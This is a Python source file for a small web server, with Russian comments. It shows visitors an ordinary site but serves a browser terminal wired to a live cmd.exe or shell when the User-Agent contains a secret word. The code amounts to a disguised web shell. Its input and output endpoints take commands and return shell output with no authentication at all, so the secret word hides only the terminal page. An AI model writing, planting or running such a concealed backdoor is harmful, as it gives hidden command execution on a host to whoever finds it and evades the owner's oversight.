import os
import subprocess
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
SECRET_UA = "огурец"
BASE = os.path.dirname(os.path.abspath(__file__))
BUF_CAP = 5 * 1024 * 1024

try:
    from winpty import PtyProcess as ConPTY
except Exception:
    ConPTY = None


class Shell:
    def __init__(self):
        self.lock = threading.Lock()
        self.buf = bytearray()
        self.alive = False
        self.proc = None
        self.pipe = None
        self.size = (30, 120)
        self.start()

    def start(self):
        try:
            if ConPTY is not None:
                self.proc = ConPTY.spawn("cmd.exe", cwd=BASE, dimensions=self.size)
            else:
                exe = ["cmd.exe"] if os.name == "nt" else ["/bin/sh", "-i"]
                self.pipe = subprocess.Popen(
                    exe,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    cwd=BASE,
                )
                if os.name == "nt":
                    self.pipe.stdin.write(b"chcp 65001\r\n")
                    self.pipe.stdin.flush()
        except Exception as e:
            sys.stdout.reconfigure(errors="replace")
            print("не смог запустить шелл:", e)
            return
        self.alive = True
        threading.Thread(target=self._reader, daemon=True).start()

    def _reader(self):
        try:
            while True:
                if ConPTY is not None:
                    chunk = self.proc.read()
                    if not chunk:
                        break
                    data = chunk.encode("utf-8", "replace")
                else:
                    chunk = self.pipe.stdout.read1(65536)
                    if not chunk:
                        break
                    data = chunk
                with self.lock:
                    self.buf += data
                    if len(self.buf) > BUF_CAP:
                        del self.buf[: len(self.buf) - BUF_CAP]
        except Exception:
            pass
        finally:
            self.alive = False

    def write(self, data: bytes):
        if not self.alive:
            self.start()
        try:
            if ConPTY is not None:
                self.proc.write(data.decode("utf-8", "replace"))
            elif self.pipe and self.pipe.stdin:
                self.pipe.stdin.write(data)
                self.pipe.stdin.flush()
        except Exception:
            self.alive = False

    def resize(self, cols: int, rows: int):
        self.size = (rows, cols)
        if ConPTY is not None and self.alive:
            try:
                self.proc.set_size(rows, cols)
            except Exception:
                pass

    def snapshot(self, pos: int):
        with self.lock:
            n = len(self.buf)
            if pos < 0 or pos > n:
                pos = max(0, min(pos, n))
                pos = n - min(n, 65536) if pos > n else pos
            return bytes(self.buf[pos:]), len(self.buf)


shell = Shell()


PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>🥒 абсолютно обычный сайт</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@xterm/xterm@5.5.0/css/xterm.min.css">
<script src="https://cdn.jsdelivr.net/npm/@xterm/xterm@5.5.0/lib/xterm.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@xterm/addon-fit@0.10.0/lib/addon-fit.min.js"></script>
<style>
  html,body{margin:0;height:100%;background:#0a140a;}
  #wrap{height:100%;padding:6px;box-sizing:border-box;}
  #t{height:100%;}
</style>
</head>
<body>
<div id="wrap"><div id="t"></div></div>
<script>
const term = new Terminal({
  cursorBlink: true,
  fontFamily: "'Courier New', monospace",
  fontSize: 16,
  scrollback: 5000,
  theme: { background: "#0a140a", foreground: "#adff2f", cursor: "#adff2f", selectionBackground: "#2e8b2e" }
});
const fit = new FitAddon.FitAddon();
term.loadAddon(fit);
term.open(document.getElementById("t"));
fit.fit();
term.focus();

const dec = new TextDecoder();
let pos = 0;

(async function poll(){
  for(;;){
    try{
      const r = await fetch("/api/out?p=" + pos);
      const np = parseInt(r.headers.get("X-Pos") || "0", 10);
      if(np > pos){
        term.write(dec.decode(new Uint8Array(await r.arrayBuffer())));
        pos = np;
      }
    }catch(e){}
    await new Promise(z => setTimeout(z, 40));
  }
})();

term.onData(d => {
  fetch("/api/input", { method: "POST", body: d });
});

async function sendSize(){
  await fetch(`/api/size?cols=${term.cols}&rows=${term.rows}`);
}
sendSize();
term.onResize(sendSize);
window.addEventListener("resize", () => fit.fit());
</script>
</body>
</html>
"""


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass

    def _send(self, code, ctype, body, extra=None):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def _ua_has_cucumber(self):
        ua = self.headers.get("User-Agent") or ""
        try:
            ua = ua.encode("latin-1").decode("utf-8").lower()
        except UnicodeError:
            ua = ua.lower()
        return SECRET_UA in ua

    def do_GET(self):
        parts = urlparse(self.path)
        if parts.path == "/":
            if self._ua_has_cucumber():
                self._send(200, "text/html; charset=utf-8", PAGE.encode())
            else:
                site = open(os.path.join(BASE, "index.html"), "rb").read()
                self._send(200, "text/html; charset=utf-8", site)
            return
        if parts.path == "/api/out":
            q = parse_qs(parts.query)
            pos = int((q.get("p") or ["0"])[0])
            data, newpos = shell.snapshot(pos)
            self._send(200, "application/octet-stream", data, {"X-Pos": str(newpos)})
            return
        if parts.path == "/api/size":
            q = parse_qs(parts.query)
            cols = int((q.get("cols") or ["120"])[0])
            rows = int((q.get("rows") or ["30"])[0])
            shell.resize(cols, rows)
            self._send(200, "text/plain", b"ok")
            return
        self._send(404, "text/plain; charset=utf-8", "не огуречно".encode())

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length)
        if urlparse(self.path).path == "/api/input":
            shell.write(raw)
            self._send(200, "text/plain", b"ok")
            return
        self._send(404, "text/plain; charset=utf-8", "не огуречно".encode())


if __name__ == "__main__":
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(errors="replace")
        sys.stderr.reconfigure(errors="replace")
    ThreadingHTTPServer.allow_reuse_address = True
    srv = ThreadingHTTPServer((HOST, PORT), Handler)
    mode = "conpty (vim заведётся)" if ConPTY is not None else "простые трубы (только команды)"
    print(f"🥒 сервер хрустит на http://{HOST}:{PORT}")
    srv.serve_forever()
